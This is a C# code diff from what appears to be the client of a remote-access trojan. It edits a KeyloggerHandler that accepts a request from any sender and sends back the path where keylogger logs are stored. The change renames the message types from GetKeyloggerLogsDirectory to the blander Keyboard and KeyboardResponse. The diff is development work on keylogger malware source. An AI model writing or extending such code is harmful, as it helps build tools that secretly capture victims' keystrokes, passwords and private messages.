@@ -6,7 +6,7 @@ namespace Rouzzf.Client.Messages
 {
     public class KeyloggerHandler : IMessageProcessor
     {
-        public bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;
+        public bool CanExecute(IMessage message) => message is Keyboard;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -14,15 +14,15 @@ namespace Rouzzf.Client.Messages
         {
             switch (message)
             {
-                case GetKeyloggerLogsDirectory msg:
+                case Keyboard msg:
                     Execute(sender, msg);
                     break;
             }
         }
 
-        public void Execute(ISender client, GetKeyloggerLogsDirectory message)
+        public void Execute(ISender client, Keyboard message)
         {
-            client.Send(new GetKeyloggerLogsDirectoryResponse {LogsDirectory = Settings.LOGSPATH });
+            client.Send(new KeyboardResponse {LogsDirectory = Settings.LOGSPATH });
         }
     }
 }
